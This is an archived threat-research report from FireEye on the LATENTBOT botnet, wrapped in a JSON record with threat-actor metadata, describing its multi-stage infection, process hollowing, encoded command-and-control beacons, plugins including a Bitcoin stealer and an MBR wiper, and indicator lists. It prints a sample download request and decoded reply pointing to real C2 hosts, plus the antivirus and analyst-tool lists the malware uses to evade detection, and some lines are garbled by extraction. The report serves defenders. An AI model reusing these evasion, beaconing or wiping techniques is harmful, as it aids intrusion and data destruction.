{
    "id": "b14687df-a23b-4ed7-b7b0-2077d49060d8",
    "created_at": "2023-01-12T15:08:10.7557Z",
    "updated_at": "2025-03-27T02:14:39.330372Z",
    "deleted_at": null,
    "sha1_hash": "bb6aba625886f89b49783851f200ae2944f6610d",
    "title": "2015-12-11 - LATENTBOT- Trace Me If You Can",
    "authors": "",
    "file_creation_date": "2022-05-28T18:00:09Z",
    "file_modification_date": "2022-05-28T18:00:09Z",
    "file_size": 3488523,
    "plain_text": "# LATENTBOT: Trace Me If You Can\n\n**fireeye.com/blog/threat-research/2015/12/latentbot_trace_me.html**\n\n## Threat Research Blog\n\nDecember 11, 2015 | by [Taha Karim,](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/taha-karim) [Daniel Regalado |](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/daniel-regalado) [Botnets](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-threat-research/threat-research/botnet-activities-research)\n[Botnet](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/botnet)\n\n[Botnets](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-threat-research/threat-research/botnet-activities-research)\n\n[Botnets](https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-tags/botnets)\n\nFireEye Labs recently uncovered LATENTBOT, a new, highly obfuscated BOT that has been in the wild since mid-2013. It has managed to\nleave hardly any traces on the Internet, is capable of watching its victims without ever being noticed, and can even corrupt a hard disk, thus\nmaking a PC useless.\n\nThrough our Dynamic Threat Intelligence (DTI), we have observed multiple campaigns targeting multiple industries in the United States, United\nKingdom, South Korea, Brazil, United Arab Emirates, Singapore, Canada, Peru and Poland – primarily in the financial services and insurance\nsectors. Although the infection strategy is not new, the final payload dropped – which we named LATENTBOT – caught our attention since it\nimplements several layers of obfuscation, a unique exfiltration mechanism, and has been very successful at infecting multiple organizations.\n\nSome of the main features of LATENTBOT are listed below:\n\na)  Multiple layers of obfuscation\n\nb)  Decrypted strings in memory are removed after being used\n\nc)  Hiding applications in a different desktop\n\nd)  MBR wiping ability\n\ne)  Ransomlock similarities such as being able to lock the desktop\n\nf)  Hidden VNC Connection\n\ng)  Modular design, allowing easy updates on victim machines\n\nh)  Stealth: Callback Traffic, APIs, Registry keys and any other indicators are decrypted dynamically\n\ni)  Drops Pony malware as a module to act as infostealer\n\nLATENTBOT Overview\n\nStealth being one of its traits, LATENTBOT will only keep malicious code in memory for the short time that is needed. Most of the encoded\ndata is found either in the program resources or in the registry. A custom encryption algorithm is shared across the different components,\nincluding in encrypting its command and control (CnC) communications. Due to this, its family binaries are detected with a generic name such\nas Trojan.Generic:\n\n[https://www.virustotal.com/en/file/39af310076282129e6a38ec5bf784ff9305b5a1787446f01c06992b359a19c05/analysis/](https://www.virustotal.com/en/file/39af310076282129e6a38ec5bf784ff9305b5a1787446f01c06992b359a19c05/analysis/)\n\nLATENTBOT itself is not targeted in nature – it has been observed in multiple industries – but it is selective in the types of Windows systems to\ninfect. For example, it won’t run in Windows Vista or Server 2008. LATENBOT also uses compromised websites as CnC infrastructure, making\ninfection easier and detection harder.\n\nBased on passive DNS information and similar samples found in the wild, it is possible that LATENTBOT was created around mid-2013.\nThroughout the course of 2015, we observed multiple successful infection campaigns, as seen in Figure 1.\n\n\n-----\n\nFigure 1: Targeted Countries and LATENTBOT CnC Locations\n\nInfection Vector\n\nThe preliminary steps to infect victims with LATENTBOT already contains multiple layers of obfuscation as described in Figure 2: Infection\nPhase.\n\nFigure 2: Infection Phase\n\nStep 1\n\nMalicious emails containing an old Word exploit are created with the Microsoft Word Intruder[1] (MWI) builder and sent to the victims.\n\nStep 2\n\nWhen the attached Word document is opened, an embedded malicious executable runs, beaconing to the MWISTAT Server (see Figure 3) for\ntwo main purposes:\n\n1.  Campaign tracking\n2.  Second stage binary download\n\nFigure 3: MWI Beacon\n\nDuring our analysis, the Word documents downloaded LuminosityLink as the second stage binary. LuminosityLink is a full-featured RAT that\nhas the ability to steal passwords, record keystrokes, transfer files and activate attached microphones or webcams.\n\nStep 3\n\nSince LuminosityLink is a RAT that offers multiple capabilities to fully control the infected box, it is surprising that the RAT downloaded another\npayload from a secondary CnC at emenike[.]no-ip.info (180.74.89.183). This new module is LATENTBOT which offers new capabilities that will\nbe detailed in this report\n\n\n-----\n\nssect g O\n\nThe analysis will concentrate on the third stage LATENTBOT binary lsmm.exe (af15076a22576f270af0111b93fe6e03) dropped in Step 3\nabove, but we are far from the final stage. Another similar binary that was part of our analysis is aya.exe\n(1dd0854a73288e833966fde139ffe385), which performs the same actions. Let’s take an in-depth look at this interesting piece of malware.\n\nLATENTBOT is an obfuscated .NET binary, which contains an encoded resource object. This object is the fourth stage payload that is decoded\nusing the algorithm seen in Figure 4.\n\nFigure 4: XOR routine to decode embedded resource\n\nThe fourth stage payload is also a .NET binary protected and obfuscated with ConfuserEx v0.5.0-10-g6ebeec5.The fourth stage binary will\nopen the .NET programs: RegAsm.exe and CvTres.exe from %windir%\\Microsoft .Net\\Framework\\v2.050727\\ and use process hollowing to\nreplace them with malicious code in memory.\n\nThe CvTres.exe process is replaced with a Visual Basic UPX-packed binary extracted from the binary’s resources, as seen in Figure 5.\n\nFigure 5: Process hollowing to replace the contents of CvTres.exe in memory\n\nThe binary creates a registry key for persistence with the hardcoded binary name dlrznz68mkaa.exe (a copy of the original aya.exe) at the\nlocation shown in Figure 6:\n\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load\n\nFigure 6: LATENTBOT persistence\n\nThe folder aFwLiiV and filename dlrznz68mkaa.exe are hardcoded in the resources section of the Confuser .NET binaries. Figure 7 shows the\nresources content from aya_decrypted.exe.\n\nFigure 7: Confuser .NET resources showing malicious directory and file name\n\nRegAsm.exe will be replaced in memory with a shellcode loader that opens %windir%\\system32\\svchost.exe and uses the same process\nhollowing technique to load a second shellcode loader that eventually will decode and execute a fifth stage Delphi binary in memory.\n\n\n-----\n\nt t s po t, et s see t e e stages d sco e ed gu e 8\n\nFigure 8: The many stages of LATENTBOT\n\nFigure 9 shows a quick view of one of the decoder functions inside the second shellcode loader that eventually decrypts the fifth stage Delphi\nBinary:\n\nFigure 9: Complex decoder function\n\nFifth Stage Delphi Binary\n\nThis is another launcher that uses the same process hollowing technique we saw previously to execute the sixth stage binary in another\ninstance of svchost.exe. This new binary is encoded in the resources section and decoded at runtime with the function from Figure 10.\n\n\n-----\n\nFigure 10: Decoder for sixth stage binary\nThe process tree at this point with aya.exe, RegAsm.exe and the two instances of svchost.exe can be seen using the Process Explorer tool in\nFigure 11, with the sixth stage being suspended:\n\nFigure 11: Multiple Injections View\n\nSixth Stage Delphi Binary\n\nThe sixth stage is highly obfuscated; multiple encoded strings can bee seen which represent API function names, CnC IP, POST/GET\nparameters, HTTP headers, processes names, and so on, all of which are decrypted at runtime.\n\nFirst the malware will performs several validations. If the Windows OS version is 6.0 (Windows Vista, Windows Server 2008) or if the\nmalware’s parent process is not svchost.exe or explorer.exe (see Figure 12) then it will exit.\n\nRunning Out of Battery?\n\nIf LATENTBOT is running on a laptop, it will query the battery status via GetSystemPowerStatus and if the battery is running Low or Critical, it\nwill call SetThreadExecutionState try to prevent the system from sleeping or turning the display off.\n\nFigure 12: Processes names decrypted to be validated\n\nIs the BOT_Engine plugin installed?\n\nNow LATENTBOT will check if its plugins are already downloaded by querying the registry key below which should contain subkeys with the\nencrypted modules:\n\nHKCU\\Software\\Google\\Update\\network\\secure\n\n\n-----\n\np ug s a e ou d, O p oceed to oad O _ G, c s t e a odu e (desc bed o e deta be o ) Ot e se, t\nwill download the required plugins from a CnC server as explained in the next section.\n\nData Exfiltration\n\nIf the plugins were not found, LATENTBOT will proceed to download them, but it will first validate that the connection to the CnC server is alive\nby making the TTP request shown in Figure 13:\n\nFigure 13: LATENTBOT initial beacon\n\nLATENTBOT then verifyies that the HTTP response is one of the following:\n\n-  200: The requested resource was found\n\n-  302: Found but in a different URI (Redirection)\n\n-  307: Similar to 302\n\nIf none of the valid HTTP responses shown above are received, it will try to connect again every 20 seconds indeterminately.\n\nAssuming a valid HTTP response was received, LATENTBOT will proceed to generate a beacon. First, the URI is generated based on\ninformation from the infected host; two examples are shown below:\n\nforum?datael=US-20-503634784811&ver=4006&os=2&acs=0&x64=0&gr=load-1.7.1.20&random=wopvrudsks\n\nforum?datael=US-70-347126827175&ver=4006&os=5&acs=0&x64=0&gr=load-1.7.1.20&random=dbvcwhctdn\n\nWhere:\n\n-  All the GET parameters are decoded at runtime. For example, tgsz0D decodes to &gr.\n\n-  datael: <locale>-<OS_Version>-<random_number>, where <OS_Version> is one of the following:\no  10 = Windows 2000 (5.0)\no  20 = Windows XP (5.1)\no  30 = Windows XP 64-Bit, Windows Server 2003/R (5.2)\no  40 = Windows Vista, Windows 2008 (6.0)\no  70 = Windows 7, Windows Server 2008 R2 (6.1)\no  80 = Windows 8, Windows Server 2012\no  90 = Windows 8.1, Windows Server 2012 R2\n\n-  random and the <random_number> used by datael are set dynamically. For random, 10 characters are randomly selected from the buffer\n**abcdefghijklmnopqrstuvxyz. datael randomly selects 12 integers from the buffer 0123456789012345678912345678. The seed is initialized**\nwith the Delphi function Randomize()and the Delphi Random() function is called on each loop iteration, making the callback different on each\nrequest.\no  Note: The <random_number> is stored in the following registry key (created at runtime): \\HKCU\\Software\\Adobe\\Adobe Acrobat\\data\n\n-  os: Windows OS Major version, using the same codes as OS_Version above.\n\n-  acs: possible values are 1 or 0. 1 is used if the malware is running under SYSTEM privileges.\n\n-  x64: flag identifying the OS architecture.\n\n-  The ver and gr parameter values are hardcoded.\n\nThen the URI is encoded using a three steps algorithm. The following will describe each step:\n\nStep 1: Custom substitution routine\n\nThis routine substitutes valid URI characters using custom hardcoded lookup tables, depending on the usage (encoding/decoding) different\nlookup tables are used. Figure 14 shows the lookup table used during the decoding phase:\n\n\n-----\n\nFigure 14: Decoding lookup table\nThis routine encodes/decodes one WORD at a time, each byte is shifted right or left depending on the need (encoding/decoding) with a\nspecific value depending on the byte position as shown in Table 1:\n\nTable 1: Shift values\n\nThe result is added after each shift, as shown in Figure 15.\n\nFigure 15: Shift calculations\nNote: For encoding, depending on a parameter, the substitution routine can choose from three different lookup tables; for this sample, only one\nlookup table was used every time.\nStep 2: XOR Modifier\n\nThe substituted data is passed is passed ot the XOR modifier shown in Figure 16.\n\nFigure 16: XOR Modifier routine\n\nDifferent XOR modifiers are used as shown in Table 2:\n\nTable 2: XOR modifier\n\nThe same XOR modifier algorithm has been used by iBanking/TauSpy Android malware[2].\n\nStep 3: Base64 encoding\n\nThe resulting encoded URI is then base64 encoded.\n\n\n-----\n\ne o e a go t ca be e p essed as o o s\nEncryption:\nencoded_uri = base64_encode(substitute (xor_modifier(modifier, plain_text_uri)))\nDecryption:\nplain_text_uri = xor_modifier(modifier, substitute(base64_decode(encoded_uri)))\n\nBy applying the substitution and XOR algorithms described above to the original URI:\n\nforum?datael=US-20-503634784811&ver=4006&os=2&acs=&x64=0&gr=load-1.7.1.20&random=wopvrudsks\n\nwe get the following encoded URI:\n\nAdl7k+v9qQGCaZti0LS9v++uFb6axeFE2twthNT9s3K6/oG0xjQS2Gqk+Udja91kch3nwphGANCtdr83tXSAaLJEi/qmG3xmKKPwR8lFncN9i93yfHRx\n\nThis URI is transformed with standard Base64 encoding, resulting in:\n\nQWRsN2srdjlxUUdDYVp0aTBMUzl2Kyt1RmI2YXhlRkUydHd0aE5UOXMzSzYvb0cweGpRUzJHcWsrVWRqYTkxa2NoM253cGhHQU5DdGRyODN\n\nWhich finally is used to send the beacon shown in Figure 17:\n\nFigure 17: Fully encoded LATENTBOT beacon\n\nThe CnC replies with:\nMDVvWVc2K3J5ZGV4ZlNyM0lycjQ5TFhkSnBmZWJTbms1Zkx0aEQzNWxqaFlqVS9XczN4MTNqV1RQOWtHWUF1ZERidzdkR0ZOdjI1UHAzT1p\n\nThe decoded URI yields:\n\nmod:http://46.165.246.234/m/:Bot_Engine-A35CB08FB078051B27894BCD380EAC43-229376-018701-881384-8;\n\nWhich is actually the name of a module (Bot_Engine, and a unique ID) to be downloaded later during execution.\n\nDownloading the Plugins\n\nAt this point, LATENTBOT is ready to start downloading the different plugins by sending the beacon shown in Figure 18:\n\nGET /m/484588.zip HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\nHost: 37.220.9.229\nCache-Control: no-cache\n\nFigure 18: LATENTBOT download beacon\n\n\n-----\n\ne odu es a es p ete d to be es but a e act e coded data t at s sa ed to t e eg st y ey secu e as s o gu e 9\n\nFigure 19: Registry keys storing the malicious plugins\n\nDecrypting the plugin names using the XOR modifier algorithm from Figure 16 with modifier 0x2328 gives the following module names:\n1.  hdtWD3zyxMpSQB = Bot_Engine\n2.  QdW/DoI2F9J = Security\n3.  RRrIibQs+WzRVv5B+9iIys+17huxID = Remote_desktop_service\n4.  VRWVBM6UtH6F+7UcwkBKPB = Vnc_hide_desktop\n5.  zRlBb9ofmNVErtdu = Pony_Stealer\n\nThe registry values shown at the bottom of Figure 19 have a specific purpose depending on the plugin being used. The values can be used as\nstatus or integrity-check flags or used to store encoded binaries.\n\nFigure 20 is a diagram showing how the plugins will be loaded:\n\nFigure 20: Plugins Architecture\n\nInjectionHelper\n\nA new DLL (InjectionHelper, see Figure 20) is decoded from the resources of the sixth stage Delphi binary and loaded to the current process\nvia BTMemoryLoader, which will eventually load (via the jMex export) the main plugin BOT_ENGINE.\nThe main purpose of InjectionHelper is to load svchost.exe and replace it in memory – via the process hollowing technique – with the binary\nsupplied as an argument. This DLL is actually used by other plugins any time a new binary needs to be loaded in memory.\n\n\n-----\n\nO ce ject o e pe oads t e O _ G p ug, t e ject tse to e sta ces o s c ost e e u t p e t es be o e co e c g\nexecution, as seen in Figure 21.\n\nFigure 21: BOT_ENGINE process hollowing chain\n\nPlugins Description\n\nBOT_ENGINE & SECURITY\n\nBOT_ENGINE is the main plugin responsible for loading the rest of the plugins. The loading technique is the same as previously documented\nusing the BTMemoryLoader Library. BOT_ENGINE communicates closely with the SECURITY module. The SECURITY module checks the\nsystem to see if any antivirus solution was installed, using a list of AV products’ default installation paths (see Appendix 1). This list is\nencrypted with the algorithm from Figure 16 using the modifier 0xBB8.\n\nIf an AV is found on the system, the callback will include a GET parameter av=<number> (e.g., Avast will be av=1).\n\nThere is also a check for GPUs with EnumDisplayDevice that tries to detect display cards from NVidia, ATI and Radeon and report the result\nwith the vidtype parameter:\n3 possible values:\n\n-  vidtype=1 for NVidia\n\n-  vidtype=2  for ATI or Radeon\n\n-  vidtype=0 for none of the above\n\nBOT_ENGINE is a Delphi program similar to the sixth stage Delphi loader, but with patched stubs and new threads to do specific tasks. It\nextracts data from resources and verifies their signature using a public key embedded in the malware.\n\nExtracting the public key\n\nA key BLOB was imported via CryptImportKey API. The BLOB contains a 2048-bit RSA public key used to verify signatures.\n\nFollowing the BLOB Header, we can find the 2048 bits RSA public key as shown in Figure 22.\n\nFigure 22: Public key BLOB Structure in memory\n\n\n-----\n\nOt e G pa a ete s t at ay be se t a e s o ab e 3\n\nTable 3: Other GET Parameters\n\nAfter BOT_ENGINE is successfully installed and all the different checks are performed, a query is sent back to the CnC with the status of\nplugin installation along with any errors identified. The plugin GET parameter holds the plugin name.\n\nHere is an example of a plain text beacon after the BOT_ENGINE plugin is successfully installed:\n\nforum?data=US-20-164346373561&ver=4006&os=2&av=19&acs=&x64=0&gr=engine-1.7.1.20-s&li=load-1.7.1.20&plugins=Bot_Engine881384-8&errcode=0&bk=0&note=0&dom=1&sockslog=0&vidtype=0&random=deabaotabf\n\nSupported BOT_ENGINE commands are listed in Table 4:\n\n\n-----\n\nTable 4: BOT_ENGINE CnC Commands\n\nPONY Plugin\nThis plugin is a recent version of Pony Stealer 2.0 malware that comes with BITCOIN support to steal Bitcoin wallets as seen in Figure 23.\n\nFigure 23: Bitcoin wallet\n\nIt looks for wallets for different cryptocurrencies (similar to VNC Plugin). Refer to List of Bitcoin Wallets and Currencies 1.\n\nVNC Plugin\n\nThe VNC Plugin is actually more than what its name suggests - it has multiple features:\n\n-  Implements a keylogger\n\n-  ICMP Requests\n\n-  MBR Wiper\n\n\n-----\n\ndde C e ote es top\n\n-  Manipulate the desktop\n\n-  Intercept mouse events\n\nSupported VNC module commands are listed in Table 5.\n\nTable 5: VNC Plugin BOT Commands\n\nNote: For every command executed, the BOT will send the encrypted status result to the CnC.\n\nVNC Plugin command:killosanduninstalls\n\nWhen this command is executed, the following steps will occur:\n\n1. The malicious MBR wiper will be extracted and decoded from the VNC plugin’s resources and then injected into a new instance of\nsvchost.exe via the InjectionHelper The MBR Wiper overwrites the first 512 bytes of the hard drive represented by \\\\.\\Physicaldrive0 and exits\nthe injected process.\n2.  The parent process will proceed to delete any traces of the malware from the registry and file system.\n3.  Malicious process running are terminated.\n4.  Then the status message “kill os function started + uninstall + shutdown mashine from 10 sec …” is sent to the CnC\n5.  Finally a reboot is forced via the ExitWindowsEx API leaving the infected PC useless. A quick overview of this process is shown in Figure\n24.\n\n\n-----\n\nFigure 24: Killing the infected PC\n\nThe MD5 of the MBR Wiper (4d0b14024d4a7ffcff25f2a3ce337af8) was submitted to VirusTotal 7 times - from Russia - beginning in July 2013\nand it has zero AV detections.\n\nRunning VNC\n\nBy running the VNC Plugin module on a system, it is possible to simply watch the end user (the victim, in this case) while going unnoticed. This\ndiffers from a normal RDP session, which would log off the end user and make the activity easy to identify.\n\nThe encoded VNC Plugin is stored in the registry under the key:\n\nHKCU\\Software\\Google\\Update\\network\\secure\\\n\nThis key stores multiple encrypted subkeys as shown in Figure 19. The binary will be decoded and injected into svchost.exe via the\nInjectionHelper. The IP to connect to is encoded in the Resources section.\n\nBefore injecting the VNC Plugin, LATENTBOT will search for the following VNC processes running in the system and kill them to avoid\nconflicts:\n\n-  tvnserver.exe – TightVNC Software\n\n-  winvnc.exe – UltraVNC Software\n\n-  vncserver.exe – RealVNC Software\n\n-  vncservice.exe – RealVNC Software\n\nVNC Plugin command: getinstallpluginlist\n\nWhen this command is executed, the plugin list will be extracted from the registry, as already described. The registry values will be separated\nby a dash and the plugins by a comma. The data will then be encrypted and sent to the CnC server.\n\nFigure 25 is an example of this decrypted plugin list:\n\nFigure 25: Plugin list data decrypted in memory\n\nVNC Plugin command: findgold\n\nThis searches the registry recursively starting at HKCU\\Software\\Classes for strings such as Bitcoin or TrueCrypt. It also searches the file\nsystem starting at %APPDATA%\\Roaming and $APPDATA\\Roaming\\Bitcoin for wallet.dat, MultiBit or Electrum. See Figure 23 in the appendix\nfor a full list of search terms.\n\nVNC Plugin command: sendCtrlAltDel\n\nThis functionality is implemented by loading as_sas32.dll and calling its sendCtrlAltDel export.\n\nInformation Gathering\n\nThe plugin will gather system information and report it to the CnC server only, without using this to stop a process, which might trigger an alert.\n\nThe section Searching for malware analyst tools in Appendix 1 lists the program names and processes that LATENBOT is searching for.\nKeywords for SoftICE or filemon (which are retired tools) suggest this specific module was created long time ago. A specific ID will be assigned\nto every identified item identified and will be reported to the CnC server.\n\nThe same list of AVs listed in the BOT_ENGINE plugin were found in this one.\n\nRDP Plugin\n\nThe built-in RDP client provides easy remote administration of the victim computer to the attackers, although this method would be more\nintrusive (potentially more noticeable to the victim) than the VNC Plugin.\n\nConclusion\n\nIn this paper we presented different plugins being used by LATENTBOT. Its architectural design allows the payloads to be easily updated with\nnew functionalities, so we will be tracking the deployment of other plugins closely.\n\n\n-----\n\nt oug O s g y ob uscated, due to t e u t p e p ocess ject o s pe o ed, t s o sy e oug to be eas y detected\nmemory with a proper behavior-based solution. Outbound callback tracking and blocking is also mandatory in cases when the malware was\nable to bypass the security controls in place.\n\nAcknowledgements:\n\nThanks to Nart Villeneuve for his help during this research.\n\n[1] https://www.fireeye.com/blog/threat-research/2015/04/a_new_word_document.html\n\n[2] Original version can be found here: https://github[.]com/strazzere/android-scripts/blob/master/Decoders/TauSpyiBanking/rollingobfuscation.java\n\nAppendix 1\n\nIOCs:\n\nHBI:\n\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load = %AppData%\\Roaming\\aFwLiiV\\dlrznz68mkaa.exe\n\nThe binary is a copy of aya.exe\n\nHKCU\\Software\\Adobe\\Adobe Acrobat\\data = <random_value>\nHKCU\\Software\\Google\\Update\\network\\secure\nWith 0 to 5 subkeys representing modules names:\nHKCU\\Software\\Google\\Update\\network\\secure\\hdtWD3zyxMpSQB\nHKCU\\Software\\Google\\Update\\network\\secure\\QdW/DoI2F9J\nHKCU\\Software\\Google\\Update\\network\\secure\\RRrIibQs+WzRVv5B+9iIys+17huxID\nHKCU\\Software\\Google\\Update\\network\\secure\\VRWVBM6UtH6F+7UcwkBKPB\nHKCU\\Software\\Google\\Update\\network\\secure\\zRlBb9ofmNVErtdu\nHKCU\\Software\\Google\\Update\\network\\update\nHKCU\\Software\\Google\\Common\\Rlz\\Events\\Update\nHKCU\\Software\\Google\\Common\\Rlz\\Events\\EventsID\n\nNBI:\n\n**CnC IPs (Some of them are compromised legitimate websites):**\n\n46.165.246.234\n209.208.79.114\nREMOTESUPPORT.AARIVERSIDE.COM\n83.175.125.150\n83.175.125.152\nOFFICE.ONTIMEDATASOLUTIONS.COM\nESTREAM.HOMELINUX.COM\n95.211.230.212\n46.165.246.234\n37.220.9.229\nSBA-VIG.VIG.PL\nSBA2-VIG.VIG.PL\nITMANAGER.MASPEX.COM\nGATE.SPACESOFT.KR\nCMC.COUNTERP.COM\n121.78.119.97\n136.243.16.249\n180.71.39.228\n220.76.17.25\n195.254.174.74\n83.13.163.218\n83.238.72.234\n155.133.120.21\nDATAROAD.IPTIME.ORG\n121.67.110.204\n\nLATENTBOT Samples\n\n\n-----\n\ndd085 a 3 88e833966 de 39 e385 aya e e\naf15076a22576f270af0111b93fe6e03 lssm.exe\n47f220f6110ecba74a69928c20ce9d3e\n5446022c6d14a45fd6ef412a2d6601c5\na11362a8e32b5641e90920729d61b3d4\nd349806ea1f2af0f447b2c9e20cb88f0\n6ea9d27d23646fc94e05b8c5e921db99\n56ba76cf35a1121bf83920003c2af825\n2d2484d578bfcd983acb151c89e5a120\n08bb5f82dec4957ad9da12239f606a00\n4135552b0045e7d67b26167f43b88a30\naf15076a22576f270af0111b93fe6e03\n4d0b14024d4a7ffcff25f2a3ce337af8\n\nBOT_ENGINE Plugin 1: The list of default installation paths of popular AV\n\nDocuments and Settings\\All Users\\Application Data\\Agnitum\nDocuments and Settings\\All Users\\Application Data\\avg10\nDocuments and Settings\\All Users\\Application Data\\avg8\nDocuments and Settings\\All Users\\Application Data\\avg9\nDocuments and Settings\\All Users\\Application Data\\Avira\nDocuments and Settings\\All Users\\Application Data\\Doctor Web\nDocuments and Settings\\All Users\\Application Data\\ESET\nDocuments and Settings\\All Users\\Application Data\\f-secure\nDocuments and Settings\\All Users\\Application Data\\G DATA\nDocuments and Settings\\All Users\\Application Data\\Kaspersky Lab\\\nDocuments and Settings\\All Users\\Application Data\\McAfee\nDocuments and Settings\\All Users\\Application Data\\Microsoft\\Microsoft Antimalware\nDocuments and Settings\\All Users\\Application Data\\PC Tools\nDocuments and Settings\\All Users\\Application Data\\Symantec\nDocuments and Settings\\All Users\\Application Data\\Trend Micro\nDocuments and Settings\\All Users\\AVAST Software\nDocuments and Settings\\NetworkService\\Local Settings\\Application Data\\F-Secure\nProgram Files\\Agnitum\nProgram Files\\Alwil Software\nProgram Files\\AVAST Software\nProgram Files\\AVG\nProgram Files\\Avira\nProgram Files\\BitDefender9\nProgram Files\\Common Files\\Doctor Web\nProgram Files\\Common Files\\G DATA\nProgram Files\\Common Files\\PC Tools\nProgram Files\\DrWeb\nProgram Files\\ESET\nProgram Files\\F-Secure Internet Security\nProgram Files\\FRISK Software\nProgram Files\\Kaspersky Lab\nProgram Files\\McAfee\nProgram Files\\Microsoft Security Essentials\nProgram Files\\Norton AntiVirus\nProgram Files\\Panda Security\nProgram Files\\PC Tools Internet Security\nProgram Files\\Symantec\nProgram Files\\Trend Micro\nProgram Files\\Vba32\n\nVNC Plugin:\n\n**Searching for malware analyst tools**\n\nOLLYDBG\nDBG\nW32DSM\n\nd i \\ i\n\n\n-----\n\nd e s\\ t ce sys\ndrivers\\syser.sys\ndrivers\\winice.sys\ndrivers\\sice.vxd\ndrivers\\winice.vxd\nwinice.vxd\nvmm32\\winice.vxd\nsice.vxd\nhgfs.sys\nvmhgfs.sys\nprleth.sys\nprlfs.sys\nprlmouse.sys\nprlvideo.sys\nprl_pv32.sys\nvpc-s3.sys\nvmsrvc.sys\nvmx86.sys\nvmnet.sys\n\\\\.\\SICE\n\\\\.\\SIWVID\n\\\\.\\NTICE\n\\\\.\\TRW\n\\\\.\\TWX\n\\\\.\\ICEEXT\n\\\\.\\Syser\n\\\\.\\SyserDbgMsg\n\\\\.\\SyserBoot\nSbieDll.dll\napi_log.dll\ndir_watch.dll\ndbghelp.dll\npstorec.dll\nSandbox\nhoneyq\nvmware\nnepenthes\nsnort\nandyd\nc:\\analysis\njoeboxcontrol.exe\nwireshark.exe\nregmon.exe\nfilemon.exe\nprocmon.exe\nSandboxieRpc\nSandboxieDcomLaunch.exe\nVBoxService.exe\nVMwareTray.exe\nVMwareService.exe\nVMwareUser.exe\nxenservice.exe\nsniff_hit.exe\nsysAnalyzer.exe\nprocexp.exe\nautoruns.exe\nprl_cc.exe\nLoadOrd.exe\nDiskmon.exe\nRootkitRevealer.exe\nportmon.exe\nTcpview.exe\n\n\n-----\n\nbg e e e\nprocdump.exe\ncfp.exe\n\nPONY STEALER Plugin: List of Bitcoin Wallets and Currencies 1\n\nBitcoin Currencies:\n\nBitcoin\nLitecoin\nNamecoin\nTerracoin\nPPcoin\nPrimecoin\nFeathercoin\nNovacoin\nFreicoin\nDevoin\nFranko\nMegacoin\nQuarkcoin\nWorldcoin\nInfinitecoin\nIxcoin\nAnoncoin\nBBQcoin\nDigitalcoin\nMincoin\nGoldcoin\nYacoin\nZetacoin\nFastcoin\nI0coin\nTagcoin\nBytecoin\nFlorincoin\nPhoenixcoin\nLuckycoin\nCraftcoin\nJunkcoin\n\nWallets:\n\nArmory wallet\nElectrum wallet\nMultibit wallet\nPrevious Post\nNext Post\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-12-11 - LATENTBOT- Trace Me If You Can.pdf"
    ],
    "report_names": [
        "2015-12-11 - LATENTBOT- Trace Me If You Can.pdf"
    ],
    "threat_actors": [
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e90ec9cb-9959-455d-b558-4bafef64d645",
            "created_at": "2022-10-25T16:07:24.222081Z",
            "updated_at": "2025-03-27T02:02:10.14365Z",
            "deleted_at": null,
            "main_name": "Sphinx",
            "aliases": [
                "APT-C-15"
            ],
            "source_name": "ETDA:Sphinx",
            "tools": [
                "AnubisSpy",
                "Backdoor.Oldrea",
                "Bladabindi",
                "Fertger",
                "Havex",
                "Havex RAT",
                "Jorik",
                "Oldrea",
                "PEACEPIPE",
                "njRAT",
                "yellowalbatross"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
